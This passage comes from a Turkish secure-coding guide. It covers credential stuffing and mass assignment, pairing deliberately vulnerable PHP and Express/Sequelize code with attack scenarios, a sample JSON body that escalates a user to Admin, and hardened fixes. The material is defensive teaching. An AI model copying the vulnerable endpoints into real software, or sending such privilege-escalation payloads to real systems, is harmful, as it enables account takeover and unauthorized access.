    }
}
 
http_response_code(401);
echo json_encode(["success" => false, "message" => "Kullanıcı adı veya şifre hatalı."]);
?>
```
🎯 Saldırı Senaryosu
Saldırgan, bir sözlük dosyasını (wordlist) alan ve /api/login adresine saniyede yüzlerce HTTP POST isteği fırlatan otomatize bir script hazırlar. Sunucu, gelen her isteği hiçbir kısıtlamaya tabi tutmadan veri tabanına sorar ve CPU üzerinde ağır yük oluşturan şifre doğrulama fonksiyonunu (bcrypt.compare vb.) çalıştırır. Saldırgan, sunucuda hesap kilitlenmesi veya IP engellenmesi yaşanmadığı için listedeki doğru şifreye ulaşana kadar saldırıyı kesintisiz sürdürür ve hesabı ele geçirir.

🔐 Doğru ve Güvenli Kod (Secure Code)
Credential Stuffing saldırılarını önlemek için kimlik doğrulama süreçlerine, kullanıcının seçtiği şifrenin daha önce küresel bir veri ihlalinde sızdırılıp sızdırılmadığını denetleyen API entegrasyonları (örneğin "Have I Been Pwned" API'si) eklenmelidir. Ayrıca isteklerin botlar tarafından doğrudan API'ye fırlatılmasını engellemek amacıyla kriptografik token doğrulamaları (Anti-Bot Tokens) yapılmalıdır.
```php
<?php 
session_start(); 

$email = $_POST['email']; 
$password = $_POST['password']; 
$botToken = $_POST['bot_token']; 

// 1. GÜVENLİ YAPI: İstemci tarafında üretilen ve bot davranışlarını analiz eden 
// dinamik token sunucu tarafında doğrulanıyor (Örn: reCAPTCHA v3 veya Cloudflare Turnstile) 
if (!verify_bot_token($botToken)) { 
    http_response_code(403); 
    die(json_encode(["success" => false, "message" => "Bot hareketi tespit edildi."])); 
} 

// 2. [MİMARİ ÖNLEM]: Kayıt olma veya şifre değiştirme aşamalarında, şifrenin 
// veri ihlallerinde yer alıp almadığı kontrol edilmelidir. 
// Aşağıdaki fonksiyon, şifrenin SHA-1 hash değerinin ilk 5 karakterini "Have I Been Pwned" 
// servisine göndererek anonimlik kuralları (k-Anonymity) çerçevesinde sızıntı kontrolü yapar. 
if (is_password_breached($password)) { 
    http_response_code(400); 
    die(json_encode(["success" => false, "message" => "Bu şifre daha önce sızdırılmıştır. Lütfen farklı bir şifre belirleyin."])); 
} 

$query = "SELECT id, password_hash FROM users WHERE email = ?"; 
$stmt = $conn->prepare($query); 
$stmt->bind_param("s", $email); 
$stmt->execute(); 
$result = $stmt->get_result(); 

if ($result->num_rows === 1) { 
    $user = $result->fetch_assoc(); 
    if (password_verify($password, $user['password_hash'])) { 
        $_SESSION['user_id'] = $user['id']; 
        echo json_encode(["success" => true]); 
        exit; 
    } 
} 

http_response_code(401); 
echo json_encode(["success" => false, "message" => "Kullanıcı adı veya şifre hatalı."]); 
?>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Saldırganlar IP rotasyonu kullanarak standart hız sınırlandırmalarını bypass edebildikleri için, savunma hattının çok katmanlı ve bağlamsal zeka ile donatılması zorunludur:

1. Cihaz, Tarayıcı ve Konum Bazlı Anomali Doğrulaması
Saldırganlar meşru kullanıcı adı ve şifre ikilisini eşleştirseler dahi, eylemi gerçekleştirdikleri dijital çevre gerçek kullanıcıdan farklı olacaktır.

📱 Yeni Cihaz Tespiti: Kullanıcının daha önce hiç oturum açmadığı bir cihaz (User-Agent parmak izi) veya tarayıcı üzerinden başarılı bir giriş yapıldığında, oturum doğrudan başlatılmamalıdır. Kullanıcının kayıtlı e-posta adresine veya telefonuna bir "Yeni Cihaz Onay Kodu" (Device Verification Link) gönderilmelidir.

✈️ Coğrafi Anomali (İmkansız Seyahat): Kullanıcı 10 dakika önce İstanbul IP'si ile sistemde işlem yapmışken, 10 dakika sonra Gaziantep veya harici bir ülke IP'si ile giriş yapmaya çalışıyorsa, bu mantıksal imkansızlık saptanmalı ve oturum anında bloke edilerek hesap doğrulamaya düşürülmelidir.

2. Kullanıcı Numaralandırma (Account Enumeration) Engellenmesi
Credential Stuffing araçları, Combo List içerisindeki e-posta adreslerinin sistemde kayıtlı olup olmadığını anlamak için sunucunun verdiği yanıtların niteliğini veya süresini analiz eder.

💬 Jenerik Mesajlar: Giriş paneli, şifre sıfırlama veya kayıt formlarında dışarıya bilgi sızdırılmamalıdır. Hatalı denemelerde "Bu e-posta adresi kayıtlı değil" gibi detaylı yanıtlar yerine, her zaman "Kullanıcı adı veya şifre hatalı" şeklinde jenerik bir metin dönülmelidir.

⏱️ Zamanlama Saldırıları (Timing Attacks) Koruması: Sunucu, kullanıcı adı veri tabanında mevcut olduğunda şifre hash'leme (password_verify) fonksiyonunu çalıştırır ve bu işlem zaman alır (örn: 100ms). Kullanıcı adı mevcut olmadığında ise hızlıca (örn: 5ms) yanıt döner. Saldırgan bu süre farkından hesabın varlığını çözebilir. Çözüm olarak, kullanıcı adı bulunamadığında bile sistem yapay olarak şifre doğrulama fonksiyonunu boş parametrelerle çalıştırmalı ve yanıt sürelerini eşitlemelidir.

3. Çok Faktörlü Kimlik Doğrulama (MFA) ve Davranışsal WAF
🔑 Çok Faktörlü Kimlik Doğrulama (MFA): Parolanın siber saldırganların elindeki listelerde yer alması durumunda en kesin bariyer MFA mekanizmasıdır. Doğru şifre girilse bile mobil uygulama, SMS veya donanımsal anahtar (U2F) üzerinden ikinci bir doğrulama isteneceği için Credential Stuffing botları bu aşamada tamamen işlevsiz kalır.

🛡️ Davranışsal WAF Yapılandırması: Gelişmiş Web Uygulama Güvenlik Duvarları (WAF), gelen isteklerin sadece IP adresine bakmaz; isteklerin geliş sıklığını, HTTP başlıklarının dizilim sırasını ve TLS el sıkışma (TLS Fingerprinting - JA3/JA4) imzalarını inceler. Standart bir kullanıcının yapmayacağı mekanik hızda form doldurma veya sayfa atlama hareketleri saptandığında, sistem otomatik olarak araya CAPTCHA veya JavaScript meydan okuması (JS Challenge) fırlatarak bot trafiğini uygulama katmanına ulaşmadan eritir.


# 🛡️ 9. Mass Assignment (Toplu Atama Güvenlik Açığı)

Modern web çatılarının (Ruby on Rails, Laravel, Spring, ASP.NET, Express vb.) ve Nesne-İlişkisel Eşleme (**ORM - Object-Relational Mapping**) katmanlarının, istemciden gelen HTTP istek parametrelerini (JSON, Form Data) veri tabanı modellerine otomatik olarak bağlama (**Auto-binding / Mass-mapping**) özelliğinin suistimal edilmesi sonucu ortaya çıkan tasarımsal zafiyet türüne **Mass Assignment** denir.

> ⚡ **Geliştirici Kolaylığı vs. Güvenlik Riski:** Geliştirme süreçlerini hızlandırmak ve kod tekrarını önlemek amacıyla tasarlanan otomatik eşleme mekanizmaları, istemciden gelen tüm anahtar-değer (*Key-Value*) çiftlerini sunucu tarafında hiçbir filtrelemeye tabi tutmadan doğrudan veri tabanı nesnesine aktarabilir.

Saldırganlar, uygulamanın arayüzünde (UI) görünmeyen ancak arka plandaki veri tabanı şemasında veya model sınıfında yer alan kritik alanları (`is_admin`, `role`, `balance`, `premium_status`) tahmin ederek HTTP istek gövdesine enjekte ederler. Eğer sunucu katmanında hangi alanların güncellenebileceğine dair mimari bir sınırlandırma yoksa, framework bu gizli parametreleri de meşru bir veri gibi kabul ederek veri tabanına işler. Bu durum, saldırganların tek bir istek manipülasyonu ile dikey yetki yükseltme (**Privilege Escalation**) gerçekleştirmesine veya kritik sistem verilerini manipüle etmesine yol açar.

---

## 🔍 Mass Assignment Zafiyetlerinin Teknik Anatomisi

Mass Assignment zafiyetleri, istemci tarafındaki veri modeli ile sunucu tarafındaki veri tabanı modelinin birebir ve kontrolsüz şekilde eşleştiği mimarilerden beslenir. Saldırganlar bu açıklığı şu yöntemlerle sömürürler:

*   📨 **HTTP POST / PUT Gövdesi Manipülasyonu:** Kullanıcı profilini güncellerken tarayıcı arka planda sunucuya yalnızca `{"username": "ahmet", "email": "ahmet@mail.com"}` verisini gönderiyor olabilir. Saldırgan proxy araçları (*Burp Suite vb.*) vasıtasıyla bu isteği araya alarak `{"username": "ahmet", "email": "ahmet@mail.com", "is_admin": true}` şeklinde manipüle eder ve sunucuya iletir.
*   📦 **İç Nesne Enjeksiyonu (Nested Object Injection):** İlişkisel veri modellerinde saldırgan, ana nesnenin yanına alt ilişkili nesnelere ait parametreleri de ekleyebilir. Örneğin, bir sipariş oluşturma isteğinin içerisine cüzdan veya fatura nesnesine ait fiyat alanlarını (`wallet.balance: 9999`) ekleyerek sistem mantığını bozabilir.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki Node.js, Express ve Sequelize (ORM) örneğinde, bir kullanıcının profil bilgilerini güncellemesini sağlayan bir uç nokta yer almaktadır. Yazılımcı, istemciden gelen gövde nesnesini (`req.body`) doğrudan güncelleme fonksiyonuna aktararak toplu atama zafiyetine zemin hazırlamıştır:

```javascript
const express = require('express');
const app = express();
app.use(express.json());
 
const { User } = require('./models'); // Sequelize Kullanıcı Modeli
 
// GÜVENSİZ YAPI: Kullanıcıdan gelen tüm nesne gövdesi doğrudan ORM'e paslanıyor
app.put('/api/user/profile', async (req, res) => {
    try {
        const userId = req.user.id; // Oturum açmış kullanıcının ID değeri
        
        // req.body içerisindeki tüm anahtarlar filtrelenmeden update fonksiyonuna veriliyor
        await User.update(req.body, {
            where: { id: userId }
        });
        
        return res.status(200).json({ success: true, message: "Profiliniz güncellendi." });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
});
 
app.listen(3000);
```
🎯 Saldırı Senaryosu
Sistemde standart yetkilere sahip bir saldırgan, profil güncelleme butonuna bastığında arka plana giden HTTP PUT isteğinin gövdesine meşru alanların dışındaki gizli parametreleri ekler:
```json
{
  "username": "saldirgan_user",
  "email": "saldirgan@mail.com",
  "role": "Admin",
  "is_verified": true
}
```
Sequelize ORM motoru, req.body içerisindeki tüm elemanları döngüye alarak SQL sorgusunu dinamik biçimde inşa eder. Arka planda çalışan nihai SQL komutu şu şekle bürünür:
```sql
UPDATE users SET username = 'saldirgan_user', email = 'saldirgan@mail.com', role = 'Admin', is_verified = true WHERE id = 45;
```
Sonuç: Saldırgan rolünü "Admin" olarak günceller ve bir sonraki istekte yönetimsel fonksiyonlara tam yetkili olarak erişim sağlar.

🔐 Doğru ve Güvenli Kod (Secure Code)
Mass Assignment saldırılarını önlemenin en kesin yöntemi, kullanıcının hangi parametreleri değiştirebileceğini sunucu tarafında mimari olarak sınırlandırmak ve framework'lerin sunduğu Beyaz Liste (Whitelist) veya güvenli parametre bağlama özelliklerini zorunlu kılmaktır.

Çözüm A: Alan Seçimi (Destructuring / Explicit Mapping) ile Sınırlandırma
Girdileri doğrudan bir bütün olarak kabul etmek yerine, sadece güncellenmesine açıkça izin verilen alanlar ayıklanarak modele aktarılmalıdır.
```javascript
const express = require('express');
const app = express();
app.use(express.json());
 
const { User } = require('./models');
 
// GÜVENLİ YAPI: Sadece izin verilen alanlar nesneden dışarı çıkartılıyor
app.put('/api/user/profile', async (req, res) => {
    try {
        const userId = req.user.id;
        
        // req.body içerisinden sadece username ve email alanları açıkça alınır
        // Saldırgan araya is_admin veya role eklese bile bu değişkenler boşa düşer ve işlenmez
        const { username, email } = req.body;
        
        await User.update(
            { username, email }, 
            { where: { id: userId } }
        );
        
        return res.status(200).json({ success: true, message: "Profiliniz güvenli bir şekilde güncellendi." });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
});
 
app.listen(3000);
```
Çözüm B: Framework Seviyesinde Beyaz Liste (Laravel Örneği)
Eğer Laravel benzeri aktif kayıt (Active Record) desenine sahip çatıları kullanıyorsanız, model sınıfı içerisinde $fillable dizisi tanımlanarak toplu atamaya izin verilen alanlar beyaz listeye alınmalı; hassas alanlar ise koruma altında tutulmalıdır.
```php
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class User extends Model
{
    // GÜVENLİ YAPI: Sadece bu sütunların toplu atama (Mass Assignment) ile güncellenmesine izin verilir.
    // 'role', 'is_admin' veya 'balance' gibi kritik sütunlar buraya yazılmadığı için dışarıdan manipüle edilemez.
    protected $fillable = [
        'username',
        'email',
        'bio'
    ];

    // Alternatif olarak $guarded dizisi kullanılarak belirli alanlar kara listeye alınabilir:
    // protected $guarded = ['role', 'is_admin'];
}
```
🧱 Savunma Katmanları (Defense-in-Depth)
Toplu atama açıklarına karşı sistem mimarisini daha dirençli hale getirmek amacıyla şu ek koruma katmanları entegre edilmelidir:

1. DTO (Data Transfer Object) Mimarisi Kullanımı
Modern yazılım tasarımlarında (özellikle Spring Boot ve ASP.NET Core gibi kurumsal mimarilerde), veri tabanı şemasını temsil eden ham "Domain/Entity" modelleri hiçbir zaman dış dünyaya ve HTTP istek süreçlerine doğrudan maruz bırakılmamalıdır.

📥 Veri Transfer Nesneleri (DTO): İstemciden gelen verileri karşılamak amacıyla sadece izin verilen alanları barındıran özel sınıflar tasarlanmalıdır.

🛡️ İzolasyon Duvarı: Gelen HTTP isteği önce DTO sınıfına bağlanır, ardından sunucu tarafında meşruiyeti doğrulanmış bu DTO nesnesi güvenli eşleme kütüphaneleri (AutoMapper, MapStruct vb.) vasıtasıyla gerçek veri tabanı modeline dönüştürülür.

2. Rol Bazlı Parametre Kontrolü
Bazı veri alanlarının değiştirilmesi standart kullanıcılara yasak iken, yöneticilere (Admin) açık olabilir. Bu gibi senaryolarda parametre beyaz listeleri statik değil, dinamik ve rol bazlı olarak yönetilmelidir.

Dinamik Şemalar: İstek işlenirken mevcut oturumun rolü doğrulanmalıdır. Eğer istek sahibi bir yönetici ise, genişletilmiş bir DTO şeması veya daha geniş bir beyaz liste fonksiyonu devreye sokulmalıdır. Standart kullanıcılar için ise kısıtlı şablonlar işletilerek yetki sınırları katı bir şekilde korunmalıdır.

3. Sıkı Şema Denetimi ve Girdi Validasyonu
Sisteme kabul edilen JSON veya form verileri, daha iş mantığına (Business Logic) ve ORM katmanına ulaşmadan önce sıkı bir şema doğrulama filtresinden geçirilmelidir.

🛠️ Şema Doğrulama: Node.js mimarilerinde Joi veya Zod, Java mimarilerinde Hibernate Validator gibi kütüphaneler kullanılarak girdilerin şeması tanımlanmalıdır.

🧹 Bilinmeyenleri Ayıklama: Şema tanımlamalarında stripUnknown: true veya noUnknown() gibi katı kurallar aktif edilerek, şemada açıkça belirtilmemiş tüm bilinmeyen ve fazladan gönderilen parametreler daha kapıda tamamen ayıklanmalı ve yok edilmelidir.
